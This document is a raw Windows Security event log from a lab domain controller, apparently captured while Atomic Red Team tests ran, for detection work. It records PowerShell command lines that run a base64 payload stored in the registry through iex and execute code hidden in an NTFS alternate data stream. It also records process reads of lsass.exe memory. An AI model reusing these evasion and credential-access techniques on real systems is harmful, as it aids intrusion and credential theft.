SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382486
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1b94
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {# Encoded payload in next command is the following \""Set-Content -path \""$env:SystemRoot/Temp/art-marker.txt\"" -value \""Hello from the Atomic Red Team\""\""
reg.exe add \""HKEY_CURRENT_USER\Software\Classes\AtomicRedTeam\"" /v ART /t REG_SZ /d \""U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\""
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\AtomicRedTeam').ART)))} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382485
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x258
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382484
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x258
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:40 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4663
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kernel Object
OpCode=Info
RecordNumber=1382483
Keywords=Audit Success
Message=An attempt was made to access an object.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Object:
	Object Server:		Security
	Object Type:		Process
	Object Name:		\Device\HarddiskVolume1\Windows\System32\lsass.exe
	Handle ID:		0x214
	Resource Attributes:	-

Process Information:
	Process ID:		0x1ad4
	Process Name:		C:\Windows\System32\wbem\WmiPrvSE.exe

Access Request Information:
	Accesses:		Read from process memory
				
	Access Mask:		0x10
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4648
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382522
Keywords=Audit Success
Message=A logon was attempted using explicit credentials.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1
	Logon GUID:		{36BA520A-0022-0F72-A18C-6529BD1456FC}

Account Whose Credentials Were Used:
	Account Name:		administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	win-dc-974.attackrange.local
	Additional Information:	HTTP/win-dc-974.attackrange.local

Process Information:
	Process ID:		0x15dc
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Network Information:
	Network Address:	-
	Port:			-

This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382521
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x5002DCF
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382520
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5002DCF

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382519
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55163
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382518
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55163
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382517
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		::
	Source Port:		55163
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4648
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382516
Keywords=Audit Success
Message=A logon was attempted using explicit credentials.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1
	Logon GUID:		{36BA520A-0022-0F72-A18C-6529BD1456FC}

Account Whose Credentials Were Used:
	Account Name:		administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Target Server:
	Target Server Name:	win-dc-974.attackrange.local
	Additional Information:	HTTP/win-dc-974.attackrange.local

Process Information:
	Process ID:		0x15dc
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Network Information:
	Network Address:	-
	Port:			-

This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382515
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5001929

Process Information:
	New Process ID:		0x2138
	New Process Name:	C:\Windows\System32\wsmprovhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\wsmprovhost.exe -Embedding

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382514
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0xa10
	New Process Name:	C:\Windows\System32\dllhost.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x24c
	Creator Process Name:	C:\Windows\System32\svchost.exe
	Process Command Line:	C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E}

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382513
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FEEC

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382512
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Delegation

New Logon:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x5001929
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{6D9750ED-EBB5-B481-5E82-E1B9C9B4B32E}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382511
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		Administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x5001929

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382510
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55162
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382509
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		fe80::6167:9038:1edc:47d4
	Source Port:		55162
	Destination Address:	fe80::6167:9038:1edc:47d4
	Destination Port:		5985
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382508
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		5596
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		::
	Source Port:		55162
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4769
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kerberos Service Ticket Operations
OpCode=Info
RecordNumber=1382507
Keywords=Audit Success
Message=A Kerberos service ticket was requested.

Account Information:
	Account Name:		Administrator@ATTACKRANGE.LOCAL
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{A50F2B34-E1E5-F76E-79D9-2BB56BC3D163}

Service Information:
	Service Name:		krbtgt
	Service ID:		ATTACKRANGE\krbtgt

Network Information:
	Client Address:		::1
	Client Port:		0

Additional Information:
	Ticket Options:		0x60810010
	Ticket Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-

This event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.

This event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.

Ticket options, encryption types, and failure codes are defined in RFC 4120.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4648
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382506
Keywords=Audit Success
Message=A logon was attempted using explicit credentials.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1
	Logon GUID:		{36BA520A-0022-0F72-A18C-6529BD1456FC}

Account Whose Credentials Were Used:
	Account Name:		administrator
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{9FF1F2D6-BB01-E583-DB8B-8F6805F5EF4F}

Target Server:
	Target Server Name:	win-dc-974.attackrange.local
	Additional Information:	HTTP/win-dc-974.attackrange.local

Process Information:
	Process ID:		0x15dc
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Network Information:
	Network Address:	-
	Port:			-

This event is generated when a process attempts to log on an account by explicitly specifying that account’s credentials.  This most commonly occurs in batch-type configurations such as scheduled tasks, or when using the RUNAS command.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4769
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kerberos Service Ticket Operations
OpCode=Info
RecordNumber=1382505
Keywords=Audit Success
Message=A Kerberos service ticket was requested.

Account Information:
	Account Name:		Administrator@ATTACKRANGE.LOCAL
	Account Domain:		ATTACKRANGE.LOCAL
	Logon GUID:		{A50F2B34-E1E5-F76E-79D9-2BB56BC3D163}

Service Information:
	Service Name:		WIN-DC-974$
	Service ID:		ATTACKRANGE\WIN-DC-974$

Network Information:
	Client Address:		::1
	Client Port:		0

Additional Information:
	Ticket Options:		0x40810000
	Ticket Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-

This event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.

This event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.

Ticket options, encryption types, and failure codes are defined in RFC 4120.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4768
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Kerberos Authentication Service
OpCode=Info
RecordNumber=1382504
Keywords=Audit Success
Message=A Kerberos authentication ticket (TGT) was requested.

Account Information:
	Account Name:		Administrator
	Supplied Realm Name:	ATTACKRANGE
	User ID:			ATTACKRANGE\Administrator

Service Information:
	Service Name:		krbtgt
	Service ID:		ATTACKRANGE\krbtgt

Network Information:
	Client Address:		::1
	Client Port:		0

Additional Information:
	Ticket Options:		0x40810010
	Result Code:		0x0
	Ticket Encryption Type:	0x17
	Pre-Authentication Type:	2

Certificate Information:
	Certificate Issuer Name:		
	Certificate Serial Number:	
	Certificate Thumbprint:		

Certificate information is only provided if a certificate was used for pre-authentication.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382503
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382502
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x15dc
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {New-PSSession -ComputerName $env:COMPUTERNAME
Test-Connection $env:COMPUTERNAME
Set-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use -Value \""T1086 PowerShell Session Creation and Use\""
Get-Content -Path $env:TEMP\T1086_PowerShell_Session_Creation_and_Use
Remove-Item -Force $env:TEMP\T1086_PowerShell_Session_Creation_and_Use} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382501
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1c64
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382500
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55161
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382499
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55161
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:41 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382498
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1c64
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {Add-Content -Path $env:TEMP\NTFS_ADS.txt -Value 'Write-Host \""Stream Data Executed\""' -Stream 'streamCommand'
$streamcommand = Get-Content -Path $env:TEMP\NTFS_ADS.txt -Stream 'streamcommand'
Invoke-Expression $streamcommand} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382533
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		4
	Application Name:	System

Network Information:
	Direction:		Inbound
